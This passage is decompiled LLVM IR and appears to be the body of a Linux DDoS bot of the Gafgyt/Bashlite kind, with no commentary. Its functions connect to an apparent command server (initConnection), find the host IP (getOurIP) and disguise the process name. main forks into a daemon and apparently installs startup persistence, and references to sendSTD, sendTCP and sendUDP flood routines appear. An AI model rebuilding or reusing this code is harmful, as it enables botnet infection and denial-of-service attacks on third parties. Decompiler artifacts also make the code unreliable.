  %v9_e240 = icmp eq i32 %v5_e22c, 0
  br i1 %v9_e240, label %dec_label_pc_e248, label %dec_label_pc_e184

dec_label_pc_e248:                                ; preds = %dec_label_pc_e214
  %v2_e22c = load i32, i32* @global_var_272d8.63, align 4
  %tmp84 = icmp ugt i32 %v2_e22c, %storemerge9
  br i1 %tmp84, label %dec_label_pc_e184, label %dec_label_pc_e268

dec_label_pc_e268:                                ; preds = %dec_label_pc_dc84, %dec_label_pc_e248, %dec_label_pc_dc1c, %dec_label_pc_d830, %dec_label_pc_e128, %dec_label_pc_e150, %dec_label_pc_dca8, %dec_label_pc_d854, %dec_label_pc_d77c, %dec_label_pc_d810, %dec_label_pc_d804, %dec_label_pc_d714, %dec_label_pc_e044, %dec_label_pc_ddf8, %dec_label_pc_dab4, %dec_label_pc_d7b4, %dec_label_pc_d6b8
  %v1_e270 = phi i32 [ %v1_d840, %dec_label_pc_d830 ], [ %v0_e128, %dec_label_pc_e128 ], [ %v4_e160, %dec_label_pc_e150 ], [ %v0_dca8, %dec_label_pc_dca8 ], [ %v0_d854, %dec_label_pc_d854 ], [ 0, %dec_label_pc_d77c ], [ %v1_d820, %dec_label_pc_d810 ], [ 0, %dec_label_pc_d804 ], [ 0, %dec_label_pc_d714 ], [ %v3_e054, %dec_label_pc_e044 ], [ %v3_de08, %dec_label_pc_ddf8 ], [ %v3_dac4, %dec_label_pc_dab4 ], [ %v0_d78c, %dec_label_pc_d7b4 ], [ %v3_d6c8, %dec_label_pc_d6b8 ], [ 0, %dec_label_pc_dc1c ], [ %v1_e27028, %dec_label_pc_e248 ], [ 0, %dec_label_pc_dc84 ]
  store i32 %v3_d684, i32* @r4, align 4
  store i32 %v6_d684, i32* @r5, align 4
  store i32 %v9_d684, i32* @r6, align 4
  store i32 %v12_d684, i32* @r7, align 4
  store i32 %v15_d684, i32* @r8, align 4
  store i32 %v18_d684, i32* @fp, align 4
  ret i32 %v1_e270

; uselistorder directives
  uselistorder i32 %stack_var_-48.1, { 0, 2, 1 }
  uselistorder i32 %v3_e188, { 1, 0 }
  uselistorder i32 %v2_e10c, { 2, 1, 0 }
  uselistorder i32 %v1_e098, { 1, 0 }
  uselistorder i32 %v1_e07c, { 1, 0 }
  uselistorder i32 %v2_e064, { 1, 0, 3, 2 }
  uselistorder i32 %v2_df78, { 2, 1, 0 }
  uselistorder i32 %storemerge4, { 1, 0 }
  uselistorder i32 %storemerge5, { 1, 0 }
  uselistorder i32 %v1_de68, { 1, 0 }
  uselistorder i32 %v1_de4c, { 1, 0 }
  uselistorder i32 %v1_de30, { 1, 0 }
  uselistorder i32 %v2_de18, { 1, 0, 3, 2 }
  uselistorder i32 %v2_dc8c, { 2, 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %v1_db24, { 1, 0 }
  uselistorder i32 %v1_db08, { 1, 0 }
  uselistorder i32 %v1_daec, { 1, 0 }
  uselistorder i32 %v2_dad4, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 5, 6, 7, 4, 8, 9, 10, 11, 3, 12, 13, 14, 2, 1, 0, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25, 26, 27 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1cf50.477 to i32), { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32* @global_var_2d53c.499, { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1cc08.47 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_e268, { 1, 5, 4, 12, 13, 6, 0, 2, 14, 7, 3, 9, 10, 15, 8, 11, 16 }
  uselistorder label %dec_label_pc_e214, { 1, 0 }
  uselistorder label %dec_label_pc_e208, { 2, 0, 1 }
  uselistorder label %dec_label_pc_e184, { 1, 0 }
  uselistorder label %dec_label_pc_e150, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e104, { 1, 0 }
  uselistorder label %dec_label_pc_e0dc, { 1, 0 }
  uselistorder label %dec_label_pc_dfd8, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_df70, { 1, 0 }
  uselistorder label %dec_label_pc_df2c, { 1, 0 }
  uselistorder label %dec_label_pc_deec, { 1, 0 }
  uselistorder label %dec_label_pc_deb4, { 1, 0 }
  uselistorder label %dec_label_pc_de10, { 1, 0 }
  uselistorder label %dec_label_pc_dcf4, { 1, 0 }
  uselistorder label %dec_label_pc_dc84, { 1, 0 }
  uselistorder label %dec_label_pc_dc38, { 1, 0 }
  uselistorder label %dec_label_pc_dbf8, { 1, 0 }
  uselistorder label %dec_label_pc_dbc0, { 1, 0 }
  uselistorder label %dec_label_pc_db7c, { 1, 0 }
  uselistorder label %dec_label_pc_dacc, { 1, 0 }
  uselistorder label %dec_label_pc_d974, { 1, 0 }
  uselistorder label %dec_label_pc_d7e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d758, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_e2c8 = load i32, i32* @fp, align 4
  store i32 58064, i32* %stack_var_-4, align 4
  %v2_e2cc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e2cc, i32* @fp, align 4
  %v2_e2e0 = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_e2f0 = bitcast i32* %stack_var_-4116 to i8*
  %v3_e2f0 = call i32 @__GI_memset(i8* %v2_e2f0, i32 0)
  %v2_e2f8 = load i32, i32* @global_var_272d0.45, align 4
  %v2_e2fc = icmp eq i32 %v2_e2f8, 0
  br i1 %v2_e2fc, label %dec_label_pc_e320, label %dec_label_pc_e304

dec_label_pc_e304:                                ; preds = %entry
  %v1_e310 = call i32 @__GI_close(i32 %v2_e2f8)
  store i32 0, i32* @global_var_272d0.45, align 4
  br label %dec_label_pc_e320

dec_label_pc_e320:                                ; preds = %entry, %dec_label_pc_e304
  %v2_e324 = load i32, i32* @global_var_26fa8.528, align 4
  %v2_e328 = icmp eq i32 %v2_e324, 0
  br i1 %v2_e328, label %dec_label_pc_e354, label %dec_label_pc_e340

dec_label_pc_e340:                                ; preds = %dec_label_pc_e320
  %v1_e348 = add i32 %v2_e324, 1
  br label %dec_label_pc_e354

dec_label_pc_e354:                                ; preds = %dec_label_pc_e320, %dec_label_pc_e340
  %storemerge1 = phi i32 [ %v1_e348, %dec_label_pc_e340 ], [ 0, %dec_label_pc_e320 ]
  store i32 %storemerge1, i32* @global_var_26fa8.528, align 4
  %v4_e36c = mul i32 %storemerge1, 4
  %v5_e36c = add i32 %v4_e36c, ptrtoint ([20 x i8]** @global_var_26a44.530 to i32)
  %v6_e36c = inttoptr i32 %v5_e36c to i32*
  %v7_e36c = load i32, i32* %v6_e36c, align 4
  store i32 %v7_e36c, i32* @r1, align 4
  %v3_e378 = call i32 @strcpy(i8* %v2_e2f0, i32 %v7_e36c)
  store i32 %v2_e2e0, i32* @r0, align 4
  %v2_e398 = call i32 @__GI_strchr(i32 %v2_e2e0, i32 58)
  %v2_e3a0 = icmp eq i32 %v2_e398, 0
  br i1 %v2_e3a0, label %dec_label_pc_e400, label %dec_label_pc_e3a8

dec_label_pc_e3a8:                                ; preds = %dec_label_pc_e354
  store i32 %v2_e2e0, i32* @r0, align 4
  %v2_e3bc = call i32 @__GI_strchr(i32 %v2_e2e0, i32 58)
  %v1_e3c4 = add i32 %v2_e3bc, 1
  store i32 %v1_e3c4, i32* @r0, align 4
  %v1_e3cc = call i32 @atol(i32 %v1_e3c4)
  store i32 %v2_e2e0, i32* @r0, align 4
  %v2_e3ec = call i32 @__GI_strchr(i32 %v2_e2e0, i32 58)
  %v3_e3fc = inttoptr i32 %v2_e3ec to i8*
  store i8 0, i8* %v3_e3fc, align 1
  br label %dec_label_pc_e400

dec_label_pc_e400:                                ; preds = %dec_label_pc_e354, %dec_label_pc_e3a8
  %stack_var_-20.0 = phi i32 [ 123, %dec_label_pc_e354 ], [ %v1_e3cc, %dec_label_pc_e3a8 ]
  %v3_e40c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_e40c, i32* @global_var_272d0.45, align 4
  %v4_e440 = call i32 @connectTimeout(i32 %v3_e40c, i32 %v2_e2e0, i32 %stack_var_-20.0, i32 30)
  %v2_e448 = icmp eq i32 %v4_e440, 0
  %. = zext i1 %v2_e448 to i32
  store i32 %v3_e2c8, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_e2e0, { 4, 1, 0, 3, 2, 6, 5 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_e400, { 1, 0 }
  uselistorder label %dec_label_pc_e354, { 1, 0 }
  uselistorder label %dec_label_pc_e320, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e494 = load i32, i32* @fp, align 4
  store i32 %v3_e494, i32* %stack_var_-16, align 4
  %v3_e4b0 = call i32 @socket(i32 2, i32 2, i32 0)
  %v3_e4c0 = icmp eq i32 %v3_e4b0, -1
  br i1 %v3_e4c0, label %dec_label_pc_e4c8, label %dec_label_pc_e4d8

dec_label_pc_e4c8:                                ; preds = %entry
  br label %dec_label_pc_e714

dec_label_pc_e4d8:                                ; preds = %entry
  %v2_e4d8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 16, i32* @r2, align 4
  %v2_e4e8 = bitcast i32* %stack_var_-52 to i8*
  %v3_e4e8 = call i32 @__GI_memset(i8* %v2_e4e8, i32 0)
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1d134.532 to i32), i32* @r0, align 4
  %v2_e4f8 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_1d134.532 to i32))
  %v1_e508 = call i32 @__GI_htons(i32 53)
  %v3_e524 = call i32 @__libc_connect(i32 %v3_e4b0, i32 %v2_e4d8, i32 16)
  %v3_e534 = icmp eq i32 %v3_e524, -1
  br i1 %v3_e534, label %dec_label_pc_e53c, label %dec_label_pc_e54c

dec_label_pc_e53c:                                ; preds = %dec_label_pc_e4d8
  br label %dec_label_pc_e714

dec_label_pc_e54c:                                ; preds = %dec_label_pc_e4d8
  store i32 16, i32* %stack_var_-72, align 4
  %v2_e554 = ptrtoint i32* %stack_var_-68 to i32
  %v2_e558 = ptrtoint i32* %stack_var_-72 to i32
  %v5_e564 = call i32 @__GI_getsockname(i32 %v3_e4b0, i32 %v2_e554, i32 %v2_e558, i32 %v2_e554, i32 16)
  %v3_e574 = icmp eq i32 %v5_e564, -1
  br i1 %v3_e574, label %dec_label_pc_e57c, label %dec_label_pc_e58c

dec_label_pc_e57c:                                ; preds = %dec_label_pc_e54c
  br label %dec_label_pc_e714

dec_label_pc_e58c:                                ; preds = %dec_label_pc_e54c
  store i32 %tmp19, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_2d534.79 to i32), i32* @r2, align 4
  store i32 %tmp19, i32* @global_var_2d534.79, align 4
  %v3_e5a0 = call i32 @__GI_open(i32 ptrtoint ([16 x i8]* @global_var_1d13c.535 to i32), i32 0)
  %v2_e638 = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_e630

dec_label_pc_e5b0:                                ; preds = %dec_label_pc_e630
  %v8_e5c4 = call i32 @strstr(i32 %v2_e638, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1d14c.537, i32 0, i32 0), i32 %v3_e5a0, i32 %v2_e638, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v2_e5cc = icmp eq i32 %v8_e5c4, 0
  br i1 %v2_e5cc, label %dec_label_pc_e614, label %dec_label_pc_e5f4.preheader

dec_label_pc_e5f4.preheader:                      ; preds = %dec_label_pc_e5b0
  %v2_e5f89 = load i8, i8* %stack_var_-4168, align 1
  %v7_e5fc13 = icmp eq i8 %v2_e5f89, 9
  br i1 %v7_e5fc13, label %dec_label_pc_e604, label %dec_label_pc_e5e8

dec_label_pc_e5e8:                                ; preds = %dec_label_pc_e5f4.preheader, %dec_label_pc_e5e8
  %v4_e5f414 = phi i32 [ %v1_e5ec, %dec_label_pc_e5e8 ], [ %v2_e638, %dec_label_pc_e5f4.preheader ]
  %v1_e5ec = add i32 %v4_e5f414, 1
  %v5_e5f0 = inttoptr i32 %v1_e5ec to i8*
  %v2_e5f8 = load i8, i8* %v5_e5f0, align 1
  %v7_e5fc = icmp eq i8 %v2_e5f8, 9
  br i1 %v7_e5fc, label %dec_label_pc_e604, label %dec_label_pc_e5e8

dec_label_pc_e604:                                ; preds = %dec_label_pc_e5e8, %dec_label_pc_e5f4.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_e5f4.preheader ], [ %v5_e5f0, %dec_label_pc_e5e8 ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_e658

dec_label_pc_e614:                                ; preds = %dec_label_pc_e5b0
  store i32 4096, i32* @r2, align 4
  %v3_e62c = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_e630

dec_label_pc_e630:                                ; preds = %dec_label_pc_e58c, %dec_label_pc_e614
  %v4_e648 = call i32 @fdgets(i32 %v2_e638, i32 4096, i32 %v3_e5a0, i32 %v2_e638)
  %v2_e650 = icmp eq i32 %v4_e648, 0
  br i1 %v2_e650, label %dec_label_pc_e658, label %dec_label_pc_e5b0

dec_label_pc_e658:                                ; preds = %dec_label_pc_e630, %dec_label_pc_e604
  %v1_e65c = call i32 @__GI_close(i32 %v3_e5a0)
  %v4_e66c = load i8, i8* %stack_var_-4168, align 1
  %v2_e670 = icmp eq i8 %v4_e66c, 0
  br i1 %v2_e670, label %dec_label_pc_e708, label %dec_label_pc_e678

dec_label_pc_e678:                                ; preds = %dec_label_pc_e658
  %v2_e680 = ptrtoint i32* %stack_var_-4200 to i32
  store i32 %v2_e638, i32* @r1, align 4
  %v2_e698 = bitcast i32* %stack_var_-4200 to i8*
  %v3_e698 = call i32 @strcpy(i8* %v2_e698, i32 %v2_e638)
  store i32 %v2_e680, i32* @r3, align 4
  %v3_e6b8 = call i32 @ioctl(i32 %v3_e4b0, i32 35111, i32 %v2_e680)
  %v2_e6d8 = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_e6c8

dec_label_pc_e6c8:                                ; preds = %dec_label_pc_e678, %dec_label_pc_e6c8
  %storemerge47 = phi i32 [ 0, %dec_label_pc_e678 ], [ %v1_e6f4, %dec_label_pc_e6c8 ]
  %v2_e6e0 = add i32 %storemerge47, %v2_e6d8
  %v1_e6e4 = inttoptr i32 %v2_e6e0 to i8*
  %v2_e6e4 = load i8, i8* %v1_e6e4, align 1
  %v4_e6ec = add i32 %storemerge47, ptrtoint (i32* @global_var_272e0.539 to i32)
  %v5_e6ec = inttoptr i32 %v4_e6ec to i8*
  store i8 %v2_e6e4, i8* %v5_e6ec, align 1
  %v1_e6f4 = add nuw nsw i32 %storemerge47, 1
  %v7_e704 = icmp slt i32 %v1_e6f4, 6
  br i1 %v7_e704, label %dec_label_pc_e6c8, label %dec_label_pc_e708

dec_label_pc_e708:                                ; preds = %dec_label_pc_e6c8, %dec_label_pc_e658
  %v1_e70c = call i32 @__GI_close(i32 %v3_e4b0)
  %v3_e728.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_e724

dec_label_pc_e714:                                ; preds = %dec_label_pc_e57c, %dec_label_pc_e53c, %dec_label_pc_e4c8
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_e724

dec_label_pc_e724:                                ; preds = %dec_label_pc_e708, %dec_label_pc_e714
  %v3_e728 = phi i32 [ %v3_e728.pre, %dec_label_pc_e708 ], [ 0, %dec_label_pc_e714 ]
  %v2_e730 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_e730, i32* @fp, align 4
  ret i32 %v3_e728

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_e5ec, { 1, 0 }
  uselistorder i32 %v2_e638, { 2, 1, 3, 6, 0, 5, 4 }
  uselistorder i32 %v3_e4b0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 4, 2, 0, 1, 3 }
  uselistorder i32 %tmp19, { 1, 0 }
  uselistorder i8 9, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_htons, { 11, 10, 9, 8, 7, 6, 5, 3, 4, 2, 1, 0 }
  uselistorder i32 (i32)* @inet_addr, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e724, { 1, 0 }
  uselistorder label %dec_label_pc_e6c8, { 1, 0 }
  uselistorder label %dec_label_pc_e630, { 1, 0 }
  uselistorder label %dec_label_pc_e5e8, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([6 x i8]* @global_var_1d158.541 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e774 = load i32, i32* @r4, align 4
  store i32 %v3_e774, i32* %stack_var_-24, align 4
  store i32 59260, i32* %stack_var_-4, align 4
  %v19_e774 = ptrtoint i32* %stack_var_-24 to i32
  %v2_e778 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e778, i32* @fp, align 4
  %v1_e7bc = bitcast i8** %argv to i32*
  %v2_e7bc = load i32, i32* %v1_e7bc, align 4
  store i32 %v2_e7bc, i32* @r4, align 4
  %v2_e7d4 = load i32, i32* %v1_e7bc, align 4
  %v1_e7d8 = inttoptr i32 %v2_e7d4 to i8*
  %v3_e7dc = call i32 @strlen(i8* %v1_e7d8)
  %v0_e7e4 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1d160.543 to i32), i32* @r1, align 4
  %v3_e7f0 = call i32 @strncpy(i32 %v0_e7e4, i32 ptrtoint (i32* @global_var_1d160.543 to i32), i32 %v3_e7dc)
  store i32 ptrtoint (i32* @global_var_1d160.543 to i32), i32* %v1_e7bc, align 4
  %v5_e82c = call i32 @prctl(i32 15, i32 ptrtoint (i32* @global_var_1d160.543 to i32), i32 0, i32 0, i32 0)
  %v2_e834 = call i32 @__GI_time(i32* null)
  store i32 %v2_e834, i32* @r0, align 4
  store i32 %v2_e834, i32* @r4, align 4
  %v0_e83c = call i32 @__GI_getpid()
  %v0_e844 = load i32, i32* @r4, align 4
  %v2_e844 = xor i32 %v0_e844, %v0_e83c
  %v1_e84c = call i32 @srand(i32 %v2_e844)
  %v2_e854 = call i32 @__GI_time(i32* null)
  store i32 %v2_e854, i32* @r0, align 4
  store i32 %v2_e854, i32* @r4, align 4
  %v0_e85c = call i32 @__GI_getpid()
  %v0_e864 = load i32, i32* @r4, align 4
  %v2_e864 = xor i32 %v0_e864, %v0_e85c
  %v1_e86c = call i32 @init_rand(i32 %v2_e864)
  store i32 ptrtoint ([19 x i8]* @global_var_1d164.545 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_1d178.547 to i32), i32* @r1, align 4
  %v3_e888 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_1d164.545 to i32), i32 ptrtoint ([2 x i8]* @global_var_1d178.547 to i32))
  %v2_e898 = icmp eq i32 %v3_e888, 0
  br i1 %v2_e898, label %dec_label_pc_e8a0, label %dec_label_pc_e8bc

dec_label_pc_e8a0:                                ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_1d17c.549 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_1d178.547 to i32), i32* @r1, align 4
  %v3_e8b0 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_1d17c.549 to i32), i32 ptrtoint ([2 x i8]* @global_var_1d178.547 to i32))
  br label %dec_label_pc_e8bc

dec_label_pc_e8bc:                                ; preds = %entry, %dec_label_pc_e8a0
  %stack_var_-88.0 = phi i32 [ %v3_e8b0, %dec_label_pc_e8a0 ], [ %v3_e888, %entry ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1d17c.549, i32 0, i32 0), %dec_label_pc_e8a0 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1d164.545, i32 0, i32 0), %entry ]
  %v2_e8c0 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v2_e8c0, label %dec_label_pc_ea58, label %dec_label_pc_e8c8

dec_label_pc_e8c8:                                ; preds = %dec_label_pc_e8bc
  %v2_e8d8 = load i32, i32* %v1_e7bc, align 4
  %v1_e8dc = inttoptr i32 %v2_e8d8 to i8*
  %v3_e8e0 = call i32 @strlen(i8* %v1_e8dc)
  %v2_e8f4 = ptrtoint i32* %stack_var_-368 to i32
  %v2_e900 = call i32 @getcwd(i32 %v2_e8f4, i32 256)
  store i32 ptrtoint (i32* @global_var_1d18c.551 to i32), i32* @r1, align 4
  %v2_e910 = bitcast i32* %stack_var_-368 to i8*
  %v3_e910 = call i32 @__GI_strcoll(i8* %v2_e910, i32 ptrtoint (i32* @global_var_1d18c.551 to i32))
  %v2_e918 = icmp eq i32 %v3_e910, 0
  br i1 %v2_e918, label %dec_label_pc_ea50, label %dec_label_pc_e930

dec_label_pc_e924:                                ; preds = %dec_label_pc_e930
  %v1_e928 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_e930

dec_label_pc_e930:                                ; preds = %dec_label_pc_e8c8, %dec_label_pc_e924
  %stack_var_-84.0 = phi i32 [ %v1_e928, %dec_label_pc_e924 ], [ %v3_e8e0, %dec_label_pc_e8c8 ]
  %v2_e940 = load i32, i32* %v1_e7bc, align 4
  %v2_e948 = add i32 %v2_e940, %stack_var_-84.0
  %v1_e94c = inttoptr i32 %v2_e948 to i8*
  %v2_e94c = load i8, i8* %v1_e94c, align 1
  %v7_e950 = icmp eq i8 %v2_e94c, 47
  br i1 %v7_e950, label %dec_label_pc_e958, label %dec_label_pc_e924

dec_label_pc_e958:                                ; preds = %dec_label_pc_e930
  %v2_e968 = load i32, i32* %v1_e7bc, align 4
  %v2_e970 = add i32 %v2_e968, %stack_var_-84.0
  %v2_e974 = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_e974, i32* @r0, align 4
  %v8_e988 = call i32 @sprintf(i32 %v2_e974, i32 ptrtoint ([8 x i8]* @global_var_1d190.553 to i32), i32 %v2_e8f4, i32 %v2_e970, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_e9e4 = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_e998 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_e9c4 = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_e9e0.outer

dec_label_pc_e990:                                ; preds = %dec_label_pc_e9e0
  %v3_e9a8 = call i32 @fgets(i32 %v2_e998, i32 1024, i32 %stack_var_-88.0)
  %v3_e9c4 = call i32 @__GI_strcasecmp(i8* %v2_e9c4, i32 %v2_e974)
  %v2_e9cc = icmp eq i32 %v3_e9c4, 0
  br i1 %v2_e9cc, label %dec_label_pc_e9d4, label %dec_label_pc_e9e0

dec_label_pc_e9d4:                                ; preds = %dec_label_pc_e990
  %v1_e9d8 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_e9e0.outer

dec_label_pc_e9e0.outer:                          ; preds = %dec_label_pc_e9d4, %dec_label_pc_e958
  %stack_var_-80.0.ph = phi i32 [ %v1_e9d8, %dec_label_pc_e9d4 ], [ 0, %dec_label_pc_e958 ]
  br label %dec_label_pc_e9e0

dec_label_pc_e9e0:                                ; preds = %dec_label_pc_e9e0.outer, %dec_label_pc_e990
  %v2_e9e4 = call i32 @feof(i16* %v1_e9e4)
  %v2_e9ec = icmp eq i32 %v2_e9e4, 0
  br i1 %v2_e9ec, label %dec_label_pc_e990, label %dec_label_pc_e9f4

dec_label_pc_e9f4:                                ; preds = %dec_label_pc_e9e0
  %v2_e9f8 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v2_ea04 = call i32 @__GI_fclose(i16* %v1_e9e4)
  br i1 %v2_e9f8, label %dec_label_pc_ea00, label %dec_label_pc_ea58

dec_label_pc_ea00:                                ; preds = %dec_label_pc_e9f4
  %v4_ea08 = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_ea08, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1d198.555 to i32), i32* @r1, align 4
  %v3_ea10 = call i32 @__GI_fopen(i32 %v4_ea08, i32 ptrtoint (i32* @global_var_1d198.555 to i32))
  %v2_ea20 = icmp eq i32 %v3_ea10, 0
  br i1 %v2_ea20, label %dec_label_pc_ea58, label %dec_label_pc_ea28

dec_label_pc_ea28:                                ; preds = %dec_label_pc_ea00
  %v2_ea34 = call i32 @__GI_fputs(i32 %v2_e974, i32 %v3_ea10)
  %v1_ea3c = inttoptr i32 %v3_ea10 to i16*
  %v2_ea3c = call i32 @__GI_fclose(i16* %v1_ea3c)
  br label %dec_label_pc_ea58

dec_label_pc_ea50:                                ; preds = %dec_label_pc_e8c8
  %v1_ea54 = inttoptr i32 %stack_var_-88.0 to i16*
  %v2_ea54 = call i32 @__GI_fclose(i16* %v1_ea54)
  br label %dec_label_pc_ea58

dec_label_pc_ea58:                                ; preds = %dec_label_pc_e9f4, %dec_label_pc_ea00, %dec_label_pc_e8bc, %dec_label_pc_ea28, %dec_label_pc_ea50
  %v0_ea58 = call i32 @getOurIP()
  store i32 %v0_ea58, i32* @r0, align 4
  %v0_ea5c = call i32 @__libc_fork()
  store i32 %v0_ea5c, i32* @r0, align 4
  %v2_ea6c = icmp eq i32 %v0_ea5c, 0
  br i1 %v2_ea6c, label %dec_label_pc_ea9c, label %dec_label_pc_ead8

dec_label_pc_ea9c:                                ; preds = %dec_label_pc_ea58
  %v0_ea9c = call i32 @__libc_fork()
  store i32 %v0_ea9c, i32* @r0, align 4
  %v2_eaac = icmp eq i32 %v0_ea9c, 0
  br i1 %v2_eaac, label %dec_label_pc_eabc.thread, label %dec_label_pc_eac8

dec_label_pc_eabc.thread:                         ; preds = %dec_label_pc_ea9c
  br label %dec_label_pc_eae4

dec_label_pc_eac8:                                ; preds = %dec_label_pc_ea9c
  %v2_eab8 = call i32 @__GI_exit(i16 0)
  %v2_ead0 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1d19c.557 to i32))
  store i32 %v2_ead0, i32* @r0, align 4
  br label %dec_label_pc_eae4

dec_label_pc_ead8:                                ; preds = %dec_label_pc_ea58
  %v2_ea74 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v0_ea5c, i32* @r0, align 4
  %v3_ea84 = call i32 @__libc_waitpid(i32 %v0_ea5c, i32 %v2_ea74, i32 0)
  %v2_ea8c = call i32 @__GI_exit(i16 0)
  %v2_eae0 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1d19c.557 to i32))
  store i32 %v2_eae0, i32* @r0, align 4
  br label %dec_label_pc_eae4

dec_label_pc_eae4:                                ; preds = %dec_label_pc_eabc.thread, %dec_label_pc_eac8, %dec_label_pc_ead8
  %v0_eae4 = call i32 @__GI_setsid()
  %v1_eaec = call i32 @chdir(i32 ptrtoint (i32* @global_var_1d18c.551 to i32))
  %v2_eaf8 = call i32 @bsd_signal(i32 13, i32 1)
  %v2_f38c = ptrtoint i32* %stack_var_-5744 to i32
  %v4_f39c = bitcast i32* %stack_var_-5744 to i8*
  %v2_f0f8 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_f108 = bitcast i32* %stack_var_-1648 to i8*
  %v1_ef88 = or i32 %v2_f38c, 1
  %v5_ef8c = inttoptr i32 %v1_ef88 to i8*
  %v2_f25c = add i32 %v19_e774, -600
  br label %dec_label_pc_eafc.outer

dec_label_pc_eafc.outer:                          ; preds = %dec_label_pc_eee0, %dec_label_pc_f37c, %dec_label_pc_eae4
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_eae4 ], [ %stack_var_-96.2.ph, %dec_label_pc_f37c ], [ %v1_eee4, %dec_label_pc_eee0 ]
  %v0_eafc24 = call i32 @initConnection()
  %v2_eb0426 = icmp eq i32 %v0_eafc24, 0
  br i1 %v2_eb0426, label %dec_label_pc_eb18, label %dec_label_pc_eb0c

dec_label_pc_eb0c:                                ; preds = %dec_label_pc_eafc.outer, %dec_label_pc_eb0c
